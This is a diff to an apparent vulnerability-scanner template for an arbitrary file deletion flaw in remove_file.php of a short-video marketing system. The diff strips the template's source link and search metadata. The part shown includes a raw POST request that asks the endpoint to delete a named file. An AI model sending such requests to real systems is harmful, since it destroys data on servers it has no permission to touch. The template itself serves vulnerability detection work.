@@ -3,12 +3,8 @@ info:
   name: 短视频矩阵营销系统存在remove_file.php任意文件删除漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ki0qingkma5gtc6g'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ki0qingkma5gtc6g
-    fofa: '"短视频矩阵营销系统"'
 http:
 - raw:
   - 'POST /static/admin/upload_file/php/remove_file.php HTTP/1.1
@@ -36,8 +32,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     file=dudesite.txt
